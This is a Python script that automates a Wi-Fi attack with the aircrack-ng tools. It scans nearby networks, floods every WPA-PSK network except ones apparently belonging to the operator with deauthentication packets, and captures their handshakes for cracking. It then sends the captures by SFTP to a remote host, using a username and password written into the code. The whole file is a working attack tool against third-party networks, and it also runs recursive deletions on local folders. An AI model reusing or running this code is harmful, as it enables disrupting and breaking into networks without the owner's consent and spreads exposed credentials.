import threading
import os
import time
import netifaces
import subprocess
import textwrap
import sys
import paramiko
import csv

def startup():
    currentSSID = subprocess.run(["iwgetid" ,"-r"], stdout=subprocess.PIPE)
    currentSSIDSTD = currentSSID.stdout.decode("utf-8")
    print(currentSSIDSTD)

    cwd = os.getcwd()
    dirs = os.listdir(cwd)

    if "Handshakes" in dirs:
        os.system("rm -rf Handshakes/*")
        os.rmdir("Handshakes")
        os.mkdir("Handshakes")
    
    else:
        os.mkdir("Handshakes")


    if "Everything-01.cap" in dirs:
        os.system("rm -rf Everything*")
        print("ITS THERE")

    print(dirs)

    #Interfaces
    faces = netifaces.interfaces()
    if "wlp3s0mon" not in faces:
        subprocess.run(("airmon-ng start wlp3s0 1"), shell=True)

    thread1 =threading.Thread(target=pidof,args=(30,))
    thread1.start()
    subprocess.run(("airodump-ng -w Everything wlp3s0mon"),shell=True)


#Potential Targets to cycle through and send DeAuths to
targets =[]

def pidof(sleeptime): #Effective Process Killer
    time.sleep(sleeptime)
    subprocess.run(("killall -9 airodump-ng"), shell=True)

def crackinfo(): #Checks The Everything.csv file and pulls BSSID, SSID, and CHANNEL captured within
    with open("Everything-01.csv", "rt", encoding="utf-8") as f:
        reader = csv.reader(f)
        for row in reader:
            try:
                if row[0] == "BSSID":
                    continue
                elif row[0] == "Station MAC":
                    break
                elif row[3] == ' ':
                    continue
                elif row[13] == ' ':
                    continue
                elif len(row[13]) > 32:
                    continue
                else:
                    BSSID = textwrap.dedent(row[0])
                    CHANNEL = textwrap.dedent(row[3])
                    AUTHENTIFICATION = textwrap.dedent(row[7])
                    SSID = textwrap.dedent(row[13])
                    dict1 = {"BSSID":BSSID, "CHANNEL":CHANNEL,"SSID":SSID,"AUTHENTIFICATION":AUTHENTIFICATION}
                    targets.append(dict1)
            except IndexError:
                continue


def cracking(): #This is the Surveilance before the Deauth attack
    for each in targets:
        BSSID = each["BSSID"]
        SSID = each["SSID"]
        CHANNEL = each["CHANNEL"]
        if each["AUTHENTIFICATION"] != "PSK":
            continue
        if ("Sp3c" in SSID) or ("Sp3ctrum" in SSID):
            continue
        print(CHANNEL)
        print(BSSID)
        print(SSID)
        time.sleep(10)
        thread2 = threading.Thread(target=deauth, args=(BSSID,))
        thread2.start()
        print("airodump-ng","--bssid", BSSID, "-c", CHANNEL, "--write", "Handshakes/"+SSID[0:6],"wlp3s0mon")
        subprocess.run(("airodump-ng --bssid {0} -c {1} --write Handshakes/{2} wlp3s0mon").format(BSSID,CHANNEL,SSID[0:6]), shell=True)

def deauth(bssid): #Deauth Attack
    time.sleep(10)
    subprocess.run(("aireplay-ng --deauth 100 -a {0} wlp3s0mon".format(bssid)),shell=True)
    pidof(.1)

def handcheck(): #Checks for Handshakes, If Handshake, put is Shakes Subfolder
    weps = []
    caps = []
    csvs = []
    kismetcsv = []
    testableHands = []
    shakes = []
    compiled =[]

    os.chdir("Handshakes/")
    direc = os.getcwd()
    print(direc)

    files = os.listdir(direc)
    if "shakes" not in files:
        os.mkdir("shakes")

    os.chdir("shakes/")
    direc1 = os.getcwd()
    files1 = os.listdir(direc1)
    if "WEP" not in files1:
        os.mkdir("WEP")
    os.chdir(direc)
    print(os.getcwd())

#Gets all .cap files
    for each in files:
        if each.endswith(".cap"):
            caps.append(each)

        if each.endswith(".csv"):
            if each.endswith(".kismet.csv"):
                kismetcsv.append(each)
            else:
                csvs.append(each)



    for each in caps:
        eachcsv = each.replace(".cap",".csv")
        eachkismet = each.replace(".cap",".kismet.csv")
        if eachcsv in csvs and eachkismet in kismetcsv:
            dict1 = {"CAP": each, "CSV": eachcsv, "KISMET": eachkismet}
            compiled.append(dict1)

    for each in compiled:
        CAP = each["CAP"]
        CSV = each["CSV"]
        KISMET = each["KISMET"]

        l = os.popen("tail %s" %CSV).read()
        print(l)
        print("#################################################################")

        if "WEP" in l:
            print(direc + "/shakes/WEP/" +CAP)
            os.rename(CAP, direc + "/shakes/WEP/" +CAP)
            os.rename(CSV, direc + "/shakes/WEP/" +CSV)
            os.rename(KISMET, direc + "/shakes/WEP/" +KISMET)
            print(cwd)

        else:
            testableHands.append(CAP)

    for name in testableHands:
        print(name)
        pop = os.popen("aircrack-ng %s" % name).read()
        print(pop)
        if "1 handshake" in pop:
            shakes.append(name)
    print(shakes)

    for hands in shakes:
        for each in compiled:
            if hands in each["CAP"]:
                print(each["CAP"])
                print(each["CSV"])
                print(each["KISMET"])
                print("\n")

                os.rename(each["CAP"], direc + "/shakes/" +each["CAP"])
                os.rename(each["CSV"], direc + "/shakes/" +each["CSV"])
                os.rename(each["KISMET"], direc + "/shakes/" +each["KISMET"])
                print(direc)

def sendoff():
    while True:
        try:
            time.sleep(10)
            os.chdir("shakes")
            endCWD = os.getcwd()
            print(endCWD)
            listfiles = os.listdir(endCWD)
        
            host = "10.20.1.90"
            port = 22
            transport = paramiko.Transport((host,port))
            transport.connect(username="dbman", password="$3curen3t!")
            sftp = paramiko.SFTPClient.from_transport(transport)    

            for each in listfiles:
                if each == "WEP":
                    continue
                sftp.put(endCWD+ "/" + each, "/home/shakes/" + each)
                print(endCWD + "/" + each)   
            break
        except paramiko.ssh_exception.SSHException:
            continue



startup()
crackinfo()
cracking()
handcheck()
print("Done")
subprocess.run(("airmon-ng stop wlp3s0mon"), shell=True)
time.sleep(5)
sendoff()
#Stops the network interface used for monitoring
